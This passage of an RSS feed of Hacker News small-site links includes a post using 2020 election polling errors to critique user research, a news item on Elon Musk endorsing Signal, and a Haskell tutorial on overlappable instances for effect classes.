href="https://twitter.com/dvassallo/status/1334288446697865216?ref_src=twsrc%5Etfw">December 3, 2020</a></blockquote> <h2>Getting paid</h2><p>In practice, we pay everyone hourly based on their role. The range varies from $50 (customer support) to $250 (Head of Product) an hour.</p><p>Recently I standardized our rates world-wide:</p><blockquote><p lang="en" dir="ltr">🌍🌎🌏 Excited to announce we've deprecated all location-based pay! Gumroad will now pay you the same salary, no matter if you live in San Francisco, Bangalore, Lagos, or anywhere else.</p>— Sahil (@shl) <a href="https://twitter.com/shl/status/1334201934702493697?ref_src=twsrc%5Etfw">December 2, 2020</a></blockquote> <p>This rate is agreed upon during our interview process:</p><ol><li>Apply via a form.</li><li>An unpaid, few-hour challenge, that resembles the high-level work we do at Gumroad. This may include breaking down a large shipment (like Gumroad Memberships) into its atomic parts, planning the schema associated with a new feature, or writing up a Help Center article.</li><li>A paid, few-week trial period, that resembles the day-to-day work we do at Gumroad. This may …</li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sahillavingia.com/work">https://sahillavingia.com/work</a></em></p>]]>
            </description>
            <link>https://sahillavingia.com/work</link>
            <guid isPermaLink="false">hacker-news-small-sites-25673275</guid>
            <pubDate>Thu, 07 Jan 2021 16:41:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What the 2020 election taught us about user research]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25672937">thread link</a>) | @darsoli
<br/>
January 7, 2021 | https://solitaired.com/what-the-2020-election-taught-us-about-user-research | <a href="https://web.archive.org/web/*/https://solitaired.com/what-the-2020-election-taught-us-about-user-research">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>By November 5, 2020, as election results continued to be tallied, it was becoming certain that Joe Biden would go on to become the winner of the 2020 US presidential election. But the outcome was far more nail-biting than expected. After all, surveys projected him to win by <a href="https://projects.fivethirtyeight.com/polls/president-general/national/">8% points nationally</a>, high single digit margins in all swing states, including by 8.4% in Wisconsin 7.9%, in Michigan, and 2.5% in Florida.</p>
<p>Bidenâ€™s presumed strength was such that even when gold-rated pollster Anne Selzer came out with a <a href="https://www.desmoinesregister.com/story/news/politics/iowa-poll/2020/10/31/election-2020-iowa-poll-president-donald-trump-leads-joe-biden/6061937002/">+7 Trump rating in Iowa</a>, she was loudly panned â€” NYTimesâ€™ Nate Cohn <a href="https://twitter.com/Nate_Cohn/status/1322684447817453569">commented</a> â€œSelzer can be wrong, and has been before,â€� with other commentators piling on as well.</p>
<p>What happened of course was different. Trump outperformed polling by 6% in Florida, 7.7% in Wisconsin, and 7.3% in Ohio. Seltzer of Iowa ended up right, when Trump beat the Iowa consensus polling by 6.9%.</p>
<p>Whatâ€™s shocking in these results isnâ€™t that polls can be off â€” that happens. Whatâ€™s shocking is the breadth of the error, across presidential, senatorial, and house levels; across geographies; across pollsters. This miss was in the same direction, of the same intensity, as the miss in 2016, despite all the hand-wringing and adjustments and model updates that happened in the interim.</p>
<p>How did the most generously-funded, highest-quality, and highest-frequency election polling in history get it wrong? While the eulogy is still being written, many theories point to a fundamental problem â€” a response sample that turned out to be non-random.</p>
<p>For anyone who has taken a beginnerâ€™s statistics course, the foundation of all calculations rely on random sampling. Confidence intervals and margins of error are meaningless if your sample isnâ€™t random.</p>
<p>While weâ€™d like to believe polls are random samples â€” they are not. Non-responsive bias and self-selection are two of many ways samples can be improperly collected; <a href="https://www.nytimes.com/2020/11/10/upshot/polls-what-went-wrong.html">a leading theory</a> is that Trump voter social disaffection led to the polling misses.</p>
<p>We, the voting public, believed that polling firms who were well-funded and staffed to the brim with PhDs, would figure out techniques around this. As is now obvious, that assumption was dead wrong, as wrong in 2020 as it was in 2016.</p>
<h2 id="whatdoestheelectionresulthavetodowithuserresearch">What does the election result have to do with user research?</h2>
<p>If the best polling firms in the world can come to the wrong conclusions, what does this mean for user research?</p>
<p>User research often manifests itself as independent functions within larger corporations. Or, it refers to the products of companies like User Leap, User Testing, and others who promote the idea of â€œcontinuousâ€� research, promising Web app developers with the data they need to understand how users use their product.</p>
<div>

  <p><img src="https://defbnszqe1hwm.cloudfront.net/images/survey-box.png"><br>
  <span>Does this <a href="https://www.google.com/search?q=foresee+survey&amp;tbm=isch&amp;ved=2ahUKEwja8Ournu_tAhVKsFMKHQGHDKgQ2-cCegQIABAA&amp;oq=foresee+s&amp;gs_lcp=CgNpbWcQARgAMgQIIxAnMgIIADICCAAyAggAMgIIADIGCAAQCBAeMgYIABAIEB4yBggAEAgQHjIECAAQGDIECAAQGDoECAAQQzoFCAAQsQM6CAgAELEDEIMBOgcIABCxAxBDUNJhWKFsYORwaAFwAHgAgAFdiAGGBZIBAjEwmAEAoAEBqgELZ3dzLXdpei1pbWfAAQE&amp;sclient=img&amp;ei=PA7pX9riH8rgzgKBjrLACg&amp;bih=699&amp;biw=1440&amp;hl=en#imgrc=pySAZ-pP94o7hM&amp;imgdii=CoQbW0vptoztuM">annoying window</a> ring a bell?</span>

</p></div>
<p>Regardless of the tool, these approaches have the same fault at their core â€” the lack of a random sample. Most users dismiss survey prompts on web sites. Most users will never fork over our time to conduct an in-person research survey. The people that do respond are self-selecting by definition â€” maybe theyâ€™re overly pissed off about something or maybe theyâ€™re bored, but theyâ€™re definitely not random.</p>
<p>If the data youâ€™re using isnâ€™t randomly sampled, your conclusions are going to be invalid. And that can be costly â€” for your time, your team, and your business.</p>
<h2 id="howdoyoudouserresearchtherightway">How do you do user research the right way?</h2>
<h3 id="lookatyouranalyticsmorecarefully">Look at your analytics more carefully.</h3>
<p>User research purports to answer â€œwhyâ€� people behave in the ways that you see them behave in your analytics. But as we know, the whys are based on non-random samples and therefore are unsound.</p>
<p>The good news is, analytics tools like Google Analytics (or <a href="https://usefathom.com/" rel="nofollow">Fathom</a> for the privacy-minded) track nearly all users, so thereâ€™s no need to randomly sample (and when they do, itâ€™s a real random sample). They also go a long way to answer the â€œwhys.â€� Sometimes metrics differ by desktop or mobile â€” which points to device type as influential. Sometimes metrics differ by browser, which could point to specific browser bugs. With the right cut of the data, an analytics tool can often answer the why through data alone. In our case, to develop our product roadmap, we used search trends and our internal analytics to get insights that solitaire players also played <a href="https://solitaired.com/mahjong">Mahjong</a>, <a href="https://solitaired.com/freecell">FreeCell</a>, and <a href="https://solitaired.com/spider">Spider Solitaire</a>.</p>
<p>Going further, tools like HotJar record randomly-sampled screens and create heatmaps, so you can actually see what a random sample of users does on your site, which arguably is multiples more valuable than getting a response from a self-selected user or someone in a user research lab. (Note, the privacy-minded out there may not like these sorts of recording software tools â€” which is a worthy debate to have).</p>
<h3 id="experimentmore">Experiment more.</h3>
<p>Ultimately, what someone may say in a survey or explain in a lab will differ from how theyâ€™ll react in real life. The only way to know if something is working is to try it. There are many low-cost ways to try new things, including a/b testing and painted door testing (link to other post), that will minimize the time it takes for you to learn about user behavior.</p>
<p>The benefits of experimentation go beyond simply user-testing. Building an organization that can execute tests quickly means that you can iterate faster. Waiting for user research feedback can often have the opposite effect â€” adding an additional bottleneck into an often already complex software development process. <a href="https://thestartup.substack.com/p/unicorn-traits" rel="nofollow">Innovating early and often is good</a>.</p>
<h3 id="builduserresearchintoyourui">Build user research into your UI.</h3>
<p>Some sites, like Stitchfix, donâ€™t guess what their users want â€” they just ask. Integrating a survey into the actual user experience, which more or less forces users to respond and reduces bias, is another way of learning a userâ€™s intent.</p>

<h2 id="whendoestraditionaluserresearchwork">When does traditional user research work?</h2>
<p>One of the few times when user research is beneficial is when you donâ€™t need a random sample â€” aka, you have big, enterprise customers that account for a majority of your revenue.</p>
<p>Another area where user research can be important is when you have zero product and are only exploring a market. Here, however, the most important part is building relationships with potential customers â€” user research here is less about actual product workflows and more about building the customer relationships you need to get started.</p>
<p>Most importantly, user research is not just a standard stage in the product development process, where you are interviewing individual customers and relying on non-random feedback. User research should be thought about more holistically, encompassing all the tools that you have, and relying on the ones that can give you a more complete picture of user behavior â€” that includes analytics, experimentation, and data-yielding product workflows. Perhaps Googleâ€™s embrace of <a href="https://careers.google.com/jobs/results/96893097926894278-quantitative-user-experience-researcher/">quantitative user research</a> will move product development further in this direction.</p></div></div></div></div>]]>
            </description>
            <link>https://solitaired.com/what-the-2020-election-taught-us-about-user-research</link>
            <guid isPermaLink="false">hacker-news-small-sites-25672937</guid>
            <pubDate>Thu, 07 Jan 2021 16:21:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elon Musk throws a jab at Facebook, suggests using Signal instead of WhatsApp]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25672773">thread link</a>) | @CarCooler
<br/>
January 7, 2021 | https://www.teslaoracle.com/2021/01/07/elon-musk-suggests-signal-instead-whatsapp-jabs-facebook/ | <a href="https://web.archive.org/web/*/https://www.teslaoracle.com/2021/01/07/elon-musk-suggests-signal-instead-whatsapp-jabs-facebook/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
			<figure data-amp-original-style="margin-bottom:30px;">
            <figcaption data-amp-original-style="border:1px dotted blue; margin:2px 0; text-align:center;">Advertisement</figcaption>
            <amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="4076643206" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
              
            </amp-ad>
            </figure>
				<!-- .Adsense Ad -->

		
<p>At an early hour of the morning, Tesla &amp; SpaceX CEO Elon Musk tweeted “Use Signal” — the precursor for this tweet was an earlier reply to WhatsApp’s recent policy that forcefully asks to comply to data sharing with Facebook.</p>



<figure></figure>



<div><figure><a href="https://evannex.com/?ref=Iqtidar_TeslaOracle_EVANNEX_Banner" target="_blank" rel="sponsored noopener noreferrer"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/10/evannex_googlead_300x250.jpg" alt="" width="300" height="250" layout="intrinsic" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/10/evannex_googlead_300x250.jpg" alt="" width="300" height="250" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzI1MCcgd2lkdGg9JzMwMCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></a><figcaption>– Sponsored –</figcaption></figure></div>



<figure><div>
<amp-twitter width="600" height="480" layout="responsive" data-tweetid="1347165930674012168" data-width="550" data-dnt="true" i-amphtml-layout="responsive"><i-amphtml-sizer></i-amphtml-sizer><blockquote data-width="550" data-dnt="true" placeholder=""><p lang="en" dir="ltr">Yes exactly. Time to switch to Signal, folks. Open-source and independent. E2E encrypted (WhatsApp's encryption is based on the Signal protocol). Supports groups and video call now.</p>— Pranay Pathole (@PPathole) <a href="https://twitter.com/PPathole/status/1347165930674012168?ref_src=twsrc%5Etfw">January 7, 2021</a></blockquote></amp-twitter>
</div></figure>



<p>WhatsApp is actually owned by Facebook Inc. (FB), now Facebook is apparently trying to widen its human data research to the next level. With the past scandals like Cambridge Analytica, the social media platform’s credibility has been shaken.</p>



<p>Interestingly, the Cambridge Analytica scandal surfaced within a few weeks after Elon Musk <a href="https://www.theverge.com/2018/3/23/17156402/elon-musk-deleted-tesla-and-spacex-facebook-pages-twitter-challenge" target="_blank" rel="noreferrer noopener">ordered</a> to remove <a href="https://www.teslaoracle.com/topic/spacex/">SpaceX</a>, <a href="https://www.teslaoracle.com/">Tesla</a>, and his official page from Facebook. Musk has been a staunch opposer of Facebook and regularly criticizes the social media platform for bad user experience and possible misuse of personal data.</p>



<div><figure><amp-img width="465" height="1024" src="https://www.teslaoracle.com/wp-content/uploads/2021/01/WhatsApp-2021-Agreement.jpg" alt="WhatsApp 2021 agreement screenshot." srcset="https://www.teslaoracle.com/wp-content/uploads/2021/01/WhatsApp-2021-Agreement.jpg 465w, https://www.teslaoracle.com/wp-content/uploads/2021/01/WhatsApp-2021-Agreement-136x300.jpg 136w" sizes="(max-width: 465px) 100vw, 465px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="465" height="1024" src="https://www.teslaoracle.com/wp-content/uploads/2021/01/WhatsApp-2021-Agreement.jpg" alt="WhatsApp 2021 agreement screenshot." srcset="https://www.teslaoracle.com/wp-content/uploads/2021/01/WhatsApp-2021-Agreement.jpg 465w, https://www.teslaoracle.com/wp-content/uploads/2021/01/WhatsApp-2021-Agreement-136x300.jpg 136w" sizes="(max-width: 465px) 100vw, 465px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzEwMjQnIHdpZHRoPSc0NjUnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img><figcaption>WhatsApp 2021 terms of use asking for mandatory data sharing compliance with Facebook. Source: <a href="https://www.xda-developers.com/whatsapp-updates-terms-privacy-policy-mandate-data-sharing-facebook/" target="_blank" rel="noreferrer noopener">XDA</a></figcaption></figure></div>



<figure>
<amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="7514654329" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
  
</amp-ad>
</figure>



<p>In the new WhatsApp terms of use agreement (screenshot above), it’s clearly mentioned that if you do not agree with Facebook data sharing otherwise you will not be granted permission to use WhatsApp (a little rephrased I know but that’s what Facebook meant actually).</p>



<p>Now with WhatsApp’s mandatory data sharing with Facebook, <a href="https://www.teslaoracle.com/topic/elon-musk/">Elon Musk</a> decided to give a boost to Signal Private Messenger. As of this writing, Signal Messenger 570k+ users on Google Playstore vs. 127 million+ WhatsApp users. With Musk’s more than 41 million followers on Twitter, the number of Signal users is likely to hike in the coming hours, days, and weeks.</p>



<p>Another interesting bit is that Elon Musk has now <a href="https://www.bloomberg.com/news/articles/2021-01-06/musk-close-to-surpassing-bezos-as-world-s-richest-person" target="_blank" rel="noreferrer noopener">become</a> the world’s richest person with Tesla stock reaching an all-time high of $796.12 ($3,980.6 pre-split) at the time of this writing.</p>



<p>However, Signal offers real end-to-end encryption for enhanced security and privacy. <a href="https://signal.org/" target="_blank" rel="noreferrer noopener nofollow">Signal Messenger</a> has no social media partners to share data for profit and that’s even better.</p>



<p>The dilemma is, how we are going to convince our friends and family to migrate to Signal when they are addicted to WhatsApp, I don’t see that happening very soon.</p>



<p>For more interesting stories about Elon Musk, Tesla, and SpaceX, follow us on:<br><a rel="noreferrer noopener" href="https://news.google.com/publications/CAAqBwgKMOarmgswgLayAw" target="_blank">Google News</a>&nbsp;|&nbsp;<a rel="noreferrer noopener nofollow" href="https://flipboard.com/@TeslaOracle" target="_blank">Flipboard</a>&nbsp;|&nbsp;<a rel="noreferrer noopener nofollow" href="https://feedly.com/i/subscription/feed%2Fhttps%3A%2F%2Fwww.teslaoracle.com%2Ffeed%2F" target="_blank">RSS (Feedly)</a></p>
		<!-- Adsense Matched -->
        <figure>
        <amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="9763094783" data-auto-format="mcrspv" data-full-width="" i-amphtml-layout="fixed">
          
        </amp-ad>
        </figure><!-- Adsense Matched End -->
		</div></div>]]>
            </description>
            <link>https://www.teslaoracle.com/2021/01/07/elon-musk-suggests-signal-instead-whatsapp-jabs-facebook/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25672773</guid>
            <pubDate>Thu, 07 Jan 2021 16:15:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Overlappable Instances]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25672455">thread link</a>) | @gbrown_
<br/>
January 7, 2021 | https://lukasz-golebiewski.github.io/haskell/effects/2021/01/06/overlappable-instances.html | <a href="https://web.archive.org/web/*/https://lukasz-golebiewski.github.io/haskell/effects/2021/01/06/overlappable-instances.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>There are many patterns, styles and libraries which can be chosen for dealing with effects in Haskell. Today I’ll try to bring closer one of them.</p>

<p>Let’s start off with a very simple program written using tagless final style.
The program inserts a value “1” into the store under the key “key1” and then tries to retrieve it using operations defined in the <code>Store</code> type class. It logs what is happening while doing the above thanks to the <code>Logger</code>.
The instances needed for <code>IO</code> are added only to make the whole thing compile, the implementations aren’t very useful (for now!)</p>

<div><div><pre><code><span>{-# LANGUAGE DerivingStrategies,UndecidableInstances #-}</span>
<span>{-# LANGUAGE GeneralizedNewtypeDeriving, FlexibleContexts #-}</span>
<span>{-# LANGUAGE MultiParamTypeClasses, FlexibleInstances #-}</span>
<span>module</span> <span>Effects.Overlapping</span> <span>where</span>

<span>import</span> <span>Prelude</span> <span>hiding</span> <span>(</span><span>log</span><span>)</span>

<span>class</span> <span>Store</span> <span>m</span> <span>where</span>
  <span>put</span> <span>::</span> <span>k</span> <span>-&gt;</span> <span>a</span> <span>-&gt;</span> <span>m</span> <span>()</span>
  <span>get</span> <span>::</span> <span>k</span> <span>-&gt;</span> <span>m</span> <span>(</span><span>Maybe</span> <span>a</span><span>)</span>

<span>class</span> <span>Logger</span> <span>m</span> <span>where</span>
  <span>log</span> <span>::</span> <span>msg</span> <span>-&gt;</span> <span>m</span> <span>()</span>

<span>program</span> <span>::</span>
     <span>Monad</span> <span>m</span>
  <span>=&gt;</span> <span>Logger</span> <span>m</span>
  <span>=&gt;</span> <span>Store</span> <span>m</span>
  <span>=&gt;</span> <span>m</span> <span>()</span>
<span>program</span> <span>=</span> <span>do</span>
  <span>put</span> <span>key1</span> <span>val1</span>
  <span>log</span> <span>$</span> <span>"Inserted value: "</span> <span>&lt;&gt;</span> <span>show</span> <span>val1</span> <span>&lt;&gt;</span> <span>" under key: "</span> <span>&lt;&gt;</span> <span>key1</span>
  <span>maybeV</span> <span>&lt;-</span> <span>get</span> <span>key1</span>
  <span>case</span> <span>maybeV</span> <span>of</span>
    <span>Just</span> <span>v</span> <span>-&gt;</span> <span>log</span> <span>$</span> <span>"Retrieved: "</span> <span>&lt;&gt;</span> <span>v</span>
    <span>Nothing</span> <span>-&gt;</span> <span>log</span> <span>"No data found"</span>
  <span>where</span>
    <span>key1</span> <span>=</span> <span>"key1"</span>
    <span>val1</span> <span>::</span> <span>Integer</span>
    <span>val1</span> <span>=</span> <span>1</span>

<span>instance</span> <span>Store</span> <span>IO</span> <span>where</span>
  <span>put</span> <span>_</span> <span>_</span> <span>=</span> <span>pure</span> <span>()</span>
  <span>get</span> <span>_</span> <span>=</span> <span>pure</span> <span>Nothing</span>

<span>instance</span> <span>Logger</span> <span>IO</span> <span>where</span>
  <span>log</span> <span>_</span> <span>=</span> <span>pure</span> <span>()</span>

<span>main</span> <span>::</span> <span>IO</span> <span>()</span>
<span>main</span> <span>=</span> <span>program</span>
</code></pre></div></div>
<p>This is clearly limiting, because we are allowed to have only one typeclass instance for a given monad transformer. If we would like to have a NoOp instance and a real-world instance, we have to use newtype wrappers. Let’s add aliases then for our not-so-useful instances like this:</p>

<div><div><pre><code><span>newtype</span> <span>NoOpStoreT</span> <span>m</span> <span>a</span> <span>=</span> <span>NoOpStoreT</span> <span>{</span> <span>runNoOpStoreT</span> <span>::</span> <span>m</span> <span>a</span> <span>}</span>
  <span>deriving</span> <span>newtype</span> <span>(</span><span>Functor</span><span>,</span> <span>Applicative</span><span>,</span> <span>Monad</span><span>)</span>

<span>instance</span> <span>Monad</span> <span>m</span> <span>=&gt;</span> <span>Store</span> <span>(</span><span>NoOpStoreT</span> <span>m</span><span>)</span> <span>where</span>
  <span>put</span> <span>_</span> <span>_</span> <span>=</span> <span>pure</span> <span>()</span>
  <span>get</span> <span>_</span> <span>=</span> <span>pure</span> <span>Nothing</span>

<span>newtype</span> <span>NoOpLoggerT</span> <span>m</span> <span>a</span> <span>=</span> <span>NoOpLoggerT</span> <span>{</span> <span>runNoOpLoggerT</span> <span>::</span> <span>m</span> <span>a</span> <span>}</span>
  <span>deriving</span> <span>newtype</span> <span>(</span><span>Functor</span><span>,</span> <span>Applicative</span><span>,</span> <span>Monad</span><span>)</span>

<span>instance</span> <span>Monad</span> <span>m</span> <span>=&gt;</span> <span>Logger</span> <span>(</span><span>NoOpLoggerT</span> <span>m</span><span>)</span> <span>where</span>
  <span>log</span> <span>_</span> <span>=</span> <span>pure</span> <span>()</span>

<span>main</span> <span>::</span> <span>IO</span> <span>()</span>
<span>main</span> <span>=</span> <span>runNoOpStoreT</span> <span>.</span> <span>runNoOpLoggerT</span> <span>$</span> <span>program</span>
</code></pre></div></div>
<p>Compilation fails with the following error:</p>
<div><div><pre><code>    • No instance for (Store (NoOpLoggerT (NoOpStoreT IO)))
        arising from a use of ‘program’
</code></pre></div></div>
<p>Okay then, let’s add what the compiler is asking for</p>
<div><div><pre><code><span>instance</span> <span>Monad</span> <span>m</span> <span>=&gt;</span> <span>Store</span> <span>(</span><span>NoOpLoggerT</span> <span>m</span><span>)</span> <span>where</span>
  <span>put</span> <span>_</span> <span>_</span> <span>=</span> <span>pure</span> <span>()</span>
  <span>get</span> <span>_</span> <span>=</span> <span>pure</span> <span>Nothing</span>
</code></pre></div></div>
<p>This compiles and runs fine. But let’s see what happens if we reverse the application of transformers:</p>
<div><div><pre><code><span>main</span> <span>::</span> <span>IO</span> <span>()</span>
<span>main</span> <span>=</span> <span>runNoOpLoggerT</span> <span>.</span> <span>runNoOpStoreT</span> <span>$</span> <span>program</span>
</code></pre></div></div>
<p>results in:</p>
<div><div><pre><code>    • No instance for (Logger (NoOpStoreT (NoOpLoggerT IO)))
        arising from a use of ‘program’
</code></pre></div></div>
<p>After adding it in a similar manner we’ll arrive at the infamous O(n^2) instances problem!</p>
<div><div><pre><code><span>instance</span> <span>Monad</span> <span>m</span> <span>=&gt;</span> <span>Logger</span> <span>(</span><span>NoOpStoreT</span> <span>m</span><span>)</span> <span>where</span>
  <span>log</span> <span>_</span> <span>=</span> <span>pure</span> <span>()</span>
</code></pre></div></div>
<p>This gets painful really quickly when we add more classes and transformers.
Overlappable transformer instances to the rescue! Adding these both for <code>Store</code> and <code>Logger</code> makes it possible to get rid of boilerplate and allow us to stack our transformers in any<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> order! Let’s start with <code>Logger</code>:</p>

<div><div><pre><code><span>instance</span> <span>MonadTrans</span> <span>NoOpStoreT</span> <span>where</span>
  <span>lift</span> <span>a</span> <span>=</span> <span>NoOpStoreT</span> <span>a</span>

<span>instance</span> <span>(</span><span>Logger</span> <span>m</span><span>,</span> <span>MonadTrans</span> <span>t</span><span>,</span> <span>Monad</span> <span>m</span><span>)</span> <span>=&gt;</span> <span>Logger</span> <span>(</span><span>t</span> <span>m</span><span>)</span> <span>where</span>
  <span>log</span> <span>a</span> <span>=</span> <span>lift</span> <span>$</span> <span>log</span> <span>a</span>

<span>instance</span> <span>Monad</span> <span>m</span> <span>=&gt;</span> <span>Logger</span> <span>(</span><span>NoOpLoggerT</span> <span>m</span><span>)</span> <span>where</span>
  <span>log</span> <span>_</span> <span>=</span> <span>pure</span> <span>()</span>
</code></pre></div></div>
<p>We’ve defined a new instance. It is going to be available only if when a <code>Logger</code> instance already exists for <code>m</code> and we know how to wrap this monad <code>m</code> using <code>t</code>. For this to be true we need to add a <code>MonadTrans</code> instance for our <code>NoOpStoreT</code>. Thanks to this we don’t have to write all n^2 instances by hand. But the compiler has a problem now:</p>

<div><div><pre><code>   • Overlapping instances for Logger (NoOpLoggerT IO)
        arising from a use of ‘program’
      Matching instances:
        instance (Logger m, MonadTrans t, Monad m) =&gt; Logger (t m)
          -- Defined at ...
        instance Monad m =&gt; Logger (NoOpLoggerT m)
          -- Defined at ...

</code></pre></div></div>
<p>We need to tell it, that whenever two instances could be used “arising from the use of program”, one of them is less specific, and labeled using the <code>{-# OVERLAPPABLE #-}</code> pragma. Now the code compiles fine.</p>

<p>Let’s do the same for <code>Store</code> thus arriving at:</p>
<div><div><pre><code><span>newtype</span> <span>NoOpStoreT</span> <span>m</span> <span>a</span> <span>=</span> <span>NoOpStoreT</span> <span>{</span> <span>runNoOpStoreT</span> <span>::</span> <span>m</span> <span>a</span> <span>}</span>
  <span>deriving</span> <span>newtype</span> <span>(</span><span>Functor</span><span>,</span> <span>Applicative</span><span>,</span> <span>Monad</span><span>)</span>

<span>instance</span> <span>Monad</span> <span>m</span> <span>=&gt;</span> <span>Store</span> <span>(</span><span>NoOpStoreT</span> <span>m</span><span>)</span> <span>where</span>
  <span>put</span> <span>_</span> <span>_</span> <span>=</span> <span>pure</span> <span>()</span>
  <span>get</span> <span>_</span> <span>=</span> <span>pure</span> <span>Nothing</span>

<span>instance</span> <span>{-# OVERLAPPABLE #-}</span> <span>(</span><span>Store</span> <span>m</span><span>,</span> <span>MonadTrans</span> <span>t</span><span>,</span> <span>Monad</span> <span>m</span><span>)</span> <span>=&gt;</span> <span>Store</span> <span>(</span><span>t</span> <span>m</span><span>)</span> <span>where</span>
  <span>put</span> <span>a</span> <span>b</span> <span>=</span> <span>lift</span> <span>$</span> <span>put</span> <span>a</span> <span>b</span>
  <span>get</span> <span>a</span> <span>=</span> <span>lift</span> <span>$</span> <span>get</span> <span>a</span>

<span>instance</span> <span>MonadTrans</span> <span>NoOpStoreT</span> <span>where</span>
  <span>lift</span> <span>a</span> <span>=</span> <span>NoOpStoreT</span> <span>a</span>


<span>newtype</span> <span>NoOpLoggerT</span> <span>m</span> <span>a</span> <span>=</span> <span>NoOpLoggerT</span> <span>{</span> <span>runNoOpLoggerT</span> <span>::</span> <span>m</span> <span>a</span> <span>}</span>
  <span>deriving</span> <span>newtype</span> <span>(</span><span>Functor</span><span>,</span> <span>Applicative</span><span>,</span> <span>Monad</span><span>)</span>

<span>instance</span> <span>{-# OVERLAPPABLE #-}</span> <span>(</span><span>Logger</span> <span>m</span><span>,</span> <span>MonadTrans</span> <span>t</span><span>,</span> <span>Monad</span> <span>m</span><span>)</span> <span>=&gt;</span> <span>Logger</span> <span>(</span><span>t</span> <span>m</span><span>)</span> <span>where</span>
  <span>log</span> <span>a</span> <span>=</span> <span>lift</span> <span>$</span> <span>log</span> <span>a</span>

<span>instance</span> <span>MonadTrans</span> <span>NoOpLoggerT</span> <span>where</span>
  <span>lift</span> <span>a</span> <span>=</span> <span>NoOpLoggerT</span> <span>a</span>

<span>instance</span> <span>Monad</span> <span>m</span> <span>=&gt;</span> <span>Logger</span> <span>(</span><span>NoOpLoggerT</span> <span>m</span><span>)</span> <span>where</span>
  <span>log</span> <span>_</span> <span>=</span> <span>pure</span> <span>()</span>

</code></pre></div></div>
<p>Now we can run the effects in any<sup id="fnref:1:1" role="doc-noteref"><a href="#fn:1">1</a></sup> order. Both:</p>

<div><div><pre><code><span>main</span> <span>::</span> <span>IO</span> <span>()</span>
<span>main</span> <span>=</span> <span>runNoOpLoggerT</span> <span>.</span> <span>runNoOpStoreT</span> <span>$</span> <span>program</span>
</code></pre></div></div>
<p>and</p>
<div><div><pre><code><span>main</span> <span>::</span> <span>IO</span> <span>()</span>
<span>main</span> <span>=</span> <span>runNoOpStoreT</span> <span>.</span> <span>runNoOpLoggerT</span> <span>$</span> <span>program</span>
</code></pre></div></div>
<p>compile and run just fine.</p>

<p>Now let’s add some more useful instances for our classes. An implementation of a <code>Store</code> backed by a <code>Map</code> and a <code>Logger</code> capable of writing to stdout. The classes and the program had to be modified a bit in order to make the whole thing compile with the backing <code>Map</code> and <code>MonadState</code>. Luckily the existing instances didn’t need to be modified much and the end result looks like this:</p>

<div><div><pre><code><span>module</span> <span>Effects.Overlapping</span> <span>where</span>

<span>import</span> <span>Prelude</span> <span>hiding</span> <span>(</span><span>log</span><span>,</span> <span>lookup</span><span>)</span>

<span>import</span> <span>Control.Monad.Trans.Class</span> <span>(</span><span>MonadTrans</span><span>,</span> <span>lift</span><span>)</span>
<span>import</span> <span>Control.Monad.Trans.State</span> <span>(</span><span>evalStateT</span><span>)</span>
<span>import</span> <span>Control.Monad.IO.Class</span> <span>(</span><span>MonadIO</span><span>,</span> <span>liftIO</span><span>)</span>
<span>import</span> <span>Control.Monad.State.Class</span> <span>qualified</span> <span>as</span> <span>MS</span> <span>(</span><span>MonadState</span><span>,</span> <span>modify</span><span>,</span> <span>get</span><span>)</span>
<span>import</span> <span>Data.Map.Strict</span> <span>(</span><span>Map</span><span>,</span> <span>empty</span><span>,</span> <span>insert</span><span>,</span> <span>lookup</span><span>)</span>

<span>class</span> <span>Store</span> <span>m</span> <span>k</span> <span>v</span> <span>where</span>
  <span>put</span> <span>::</span> <span>k</span> <span>-&gt;</span> <span>v</span> <span>-&gt;</span> <span>m</span> <span>()</span>
  <span>get</span> <span>::</span> <span>k</span> <span>-&gt;</span> <span>m</span> <span>(</span><span>Maybe</span> <span>v</span><span>)</span>

<span>class</span> <span>Logger</span> <span>m</span> <span>a</span> <span>where</span>
  <span>log</span> <span>::</span> <span>a</span> <span>-&gt;</span> <span>m</span> <span>()</span>

<span>program</span> <span>::</span>
     <span>Monad</span> <span>m</span>
  <span>=&gt;</span> <span>Logger</span> <span>m</span> <span>String</span>
  <span>=&gt;</span> <span>Store</span> <span>m</span> <span>String</span> <span>Integer</span>
  <span>=&gt;</span> <span>m</span> <span>()</span>
<span>program</span> <span>=</span> <span>do</span>
  <span>put</span> <span>key1</span> <span>val1</span>
